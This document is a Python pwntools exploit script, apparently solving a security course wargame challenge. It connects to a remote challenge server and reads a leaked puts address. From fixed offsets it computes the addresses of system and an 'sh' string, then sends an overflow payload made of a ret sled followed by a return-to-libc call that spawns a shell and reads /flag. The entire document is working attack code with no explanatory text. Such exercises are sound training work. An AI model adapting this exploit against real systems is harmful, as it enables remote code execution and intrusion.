#!/usr/bin/python

from pwn import *
import re

#c = process("./binaries/roproprop")
c = remote("wargames.6447.sec.edu.au", 8002)
#gdb.attach(c)

offset = 1337
ret = 0x0804833a    # ret

reply = c.recvline()
puts_got = re.search("0x(.{8})", reply).group(0)
log.info("Puts at %s" % (puts_got))
puts_got = int(puts_got, 0)

system_addr = puts_got-0x24f00
sh = puts_got+0xfbd6b
log.info("System at %s" % (hex(system_addr)))
log.info("String sh at %s" % (hex(sh)))

payload = "a"
ret_len = (offset-1-12)/4
for i in range(ret_len):
	payload += p32(ret)
payload += p32(system_addr)
payload += "AAAA"
payload += p32(sh)

log.info("Sending payload...")
c.sendline(payload)

#c.interactive()
c.sendline("cat /flag")
c.recvline()
flag = c.recvline()
log.success("Flag: %s" % (flag))
c.close()
